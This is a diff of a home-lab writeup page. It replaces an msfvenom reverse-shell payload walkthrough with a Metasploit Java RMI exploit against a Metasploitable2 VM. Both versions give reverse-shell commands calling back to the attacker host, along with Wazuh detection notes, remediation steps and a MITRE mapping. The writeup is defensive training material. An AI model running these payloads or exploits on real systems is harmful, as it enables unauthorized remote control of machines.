@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Reverse shell writeup: msfvenom payload delivery from Kali to Metasploitable, Wazuh FIM and outbound connection alerts, defender takeaways.">
-    <title>Reverse Shell Payload with msfvenom | jellybeansontoasties Home Lab</title>
+    <meta name="description" content="Metasploit Java RMI exploit against Metasploitable2 port 1099, establishing a Meterpreter reverse TCP session informed by prior nmap reconnaissance.">
+    <title>Metasploit Java RMI Reverse Shell | jellybeansontoasties Home Lab</title>
     <link rel="stylesheet" href="../assets/css/style.css">
 </head>
 <body>
@@ -19,51 +19,79 @@
     </nav>
 
     <main>
-        <h1>Reverse Shell Payload with msfvenom</h1>
-        <p class="tagline">Generate and deliver a Meterpreter reverse shell from Kali to Metasploitable</p>
+        <h1>Metasploit Java RMI Reverse Shell</h1>
+        <p class="tagline">Exploiting an unauthenticated Java RMI registry on port 1099 to obtain a Meterpreter session</p>
 
         <div class="writeup-section">
-            <h3>Objective</h3>
-            <p>Generate a reverse TCP payload with msfvenom, start a Metasploit listener on Kali, and deliver/execute the payload on the victim to obtain a Meterpreter session. This demonstrates post-access payload delivery and the value of FIM and network monitoring.</p>
+            <h3>Summary</h3>
+            <p>This attack exploited an unauthenticated Java RMI service running on port 1099 of Metasploitable2 using the Metasploit Framework <code>java_rmi_server</code> module. An initial attempt to use the vsftpd 2.3.4 backdoor exploit (CVE-2011-2523) failed, demonstrating the need to adapt when exploits do not work as expected. Pivoting based on intelligence gathered during the initial nmap reconnaissance, the focus shifted to the exposed Java RMI registry, resulting in a successful Meterpreter reverse TCP session from Metasploitable (192.168.100.20) back to Kali (192.168.100.10). This shows how high-quality recon directly informs exploitation choices.</p>
         </div>
 
         <div class="writeup-section">
-            <h3>Tools used</h3>
-            <p>msfvenom, Metasploit multi/handler, netcat</p>
+            <h3>Attack Technique Used</h3>
+            <p>The attack leverages a Java deserialization vulnerability exposed through the Java RMI registry. Java RMI is designed to allow remote method invocation between Java objects across the network. On Metasploitable2, the RMI registry accepts and deserializes arbitrary Java objects without authentication. Metasploit's <code>exploit/multi/misc/java_rmi_server</code> module crafts a malicious serialized object that, when deserialized by the target JVM, executes arbitrary code and establishes a reverse TCP connection to the attacker-controlled Metasploit listener.</p>
         </div>
 
         <div class="writeup-section">
-            <h3>Commands used</h3>
-            <p><strong>Step 1 — Generate payload:</strong></p>
-            <pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.100.10 LPORT=4444 -f elf > shell.elf</code></pre>
-            <p><strong>Step 2 — Start listener on Kali:</strong></p>
-            <pre><code>msfconsole -x 'use exploit/multi/handler; set LHOST 192.168.100.10; set LPORT 4444; run'</code></pre>
-            <p><strong>Step 3 — Deliver and execute on victim</strong> (e.g. upload shell.elf via SCP or existing shell, then <code>chmod +x shell.elf && ./shell.elf</code>).</p>
+            <h3>Steps to Reproduce</h3>
+            <p><strong>Terminal:</strong> Kali SSH (<code>ssh owokali@192.168.100.10</code>)</p>
+            <pre><code>TERM=xterm msfconsole
+use exploit/multi/misc/java_rmi_server
+set RHOSTS 192.168.100.20
+set LHOST 192.168.100.10
+run</code></pre>
+
+            <p><strong>Expected output:</strong> Metasploit opens a reverse TCP handler and reports a Meterpreter session such as: <code>Meterpreter session 1 opened (192.168.100.10:4444 -&gt; 192.168.100.20:50553)</code>.</p>
+
+            <p><strong>Complete findings:</strong></p>
+            <ul>
+                <li>Metasploit started a reverse TCP handler on <code>192.168.100.10:4444</code>.</li>
+                <li>The module served a malicious payload JAR over HTTP on port 8080.</li>
+                <li>An RMI header and call were sent to the target's Java RMI registry on <code>192.168.100.20:1099</code>.</li>
+                <li>The target JVM requested, downloaded, and executed the payload JAR from the Metasploit HTTP server.</li>
+                <li>The stage (approximately 58 KB) was delivered to <code>192.168.100.20</code>.</li>
+                <li>Meterpreter session 1 opened at <code>2026-02-23 17:56:43</code> with a connection tuple <code>192.168.100.10:4444 -&gt; 192.168.100.20:50553</code>.</li>
+                <li>The session was running as root on Metasploitable, so no local privilege escalation was required.</li>
+            </ul>
         </div>
 
         <div class="writeup-section">
-            <h3>Expected output</h3>
-            <div class="screenshot-placeholder">Screenshot: Meterpreter session opened, or listener receiving connection</div>
+            <h3>Detection (Wazuh)</h3>
+            <p>This exploitation chain creates several detectable behaviors. From a network perspective, an outbound reverse TCP connection from the victim (192.168.100.20) to the attacker (192.168.100.10) on port 4444 is unusual and should stand out in flow data or IDS alerts. On the endpoint side, a Wazuh agent would observe the JVM spawning a new process and establishing an outbound connection to a non-standard high port. Wazuh rules related to process creation, network connections, and potentially Java exploitation indicators would all contribute to detecting this activity when correlated in the SIEM.</p>
         </div>
 
         <div class="writeup-section">
-            <h3>Findings</h3>
-            <p>Session opened (placeholder): after execution on the victim, the Meterpreter handler received a connection and a session was established. This provides full interactive access from the attacker machine, demonstrating how a single malicious binary can grant remote control. Document session ID and any post-exploitation steps here.</p>
+            <h3>Remediation</h3>
+            <ul>
+                <li>Disable the Java RMI registry unless it is absolutely required; most applications no longer need RMI exposed directly.</li>
+                <li>Keep the Java runtime and all Java-based services fully patched to reduce the impact of deserialization and RMI-related vulnerabilities.</li>
+                <li>Implement strict egress filtering so that servers like Metasploitable cannot initiate arbitrary outbound connections; only necessary destinations and ports should be allowed.</li>
+                <li>Never run application services as root; instead, use dedicated, least-privilege service accounts to limit blast radius when exploitation occurs.</li>
+                <li>Deploy a network IDS/IPS capable of detecting common Meterpreter and Metasploit signatures.</li>
+                <li>Implement application control or whitelisting to block unauthorized or unexpected code execution paths.</li>
+            </ul>
         </div>
 
         <div class="writeup-section">
-            <h3>Wazuh Alert</h3>
-            <p><strong>FIM alert</strong> — New binary or script created/executed (e.g. shell.elf). <strong>Outbound connection detected</strong> — the victim initiated a connection to the Kali host on the callback port (4444). Correlating FIM (new file) with outbound connections to unknown or lab IPs helps identify reverse shells and backdoors.</p>
+            <h3>MITRE ATT&amp;CK Mapping</h3>
+            <p>T1203 Exploitation for Client Execution, T1059 Command and Scripting Interpreter, T1021.004 Remote Services: SSH (used for attacker control), T1572 Protocol Tunneling.</p>
         </div>
 
         <div class="writeup-section">
-            <h3>Defender Takeaway</h3>
-            <p>Monitor for new executables in sensitive paths (FIM) and for outbound connections to non-standard ports. IOCs for reverse shells: new ELF/binaries, outbound TCP to high or uncommon ports from servers. Restrict outbound connectivity where possible (e.g. egress filtering) and treat unexpected outbound connections as high priority. Ensure Wazuh (or equivalent) is monitoring file integrity and network/connection events.</p>
+            <h3>Screenshots with captions</h3>
+            <figure>
+                <img src="../assets/images/attack_3.png" alt="Metasploit msfconsole with java_rmi_server exploit configured against Metasploitable2">
+                <figcaption>Metasploit msfconsole loaded with <code>java_rmi_server</code> exploit configured.</figcaption>
+            </figure>
+            <figure>
+                <img src="../assets/images/Meterpreter_session_1_opened.png" alt="Meterpreter session 1 opened from Metasploitable to Kali over a reverse TCP connection">
+                <figcaption>Meterpreter session 1 opened — reverse TCP connection from Metasploitable (192.168.100.20:50553) to Kali (192.168.100.10:4444).</figcaption>
+            </figure>
         </div>
 
         <nav class="writeup-nav">
-            <a href="writeup-02.html">← Previous: SSH Brute Force with Hydra</a>
-            <a href="writeup-04.html">Next: Privilege Escalation on Metasploitable →</a>
+            <a href="writeup-02.html">← Previous: Hydra Credential Brute Force</a>
+            <a href="writeup-04.html">Next: Root Access and Credential Exfiltration →</a>
         </nav>
     </main>
 
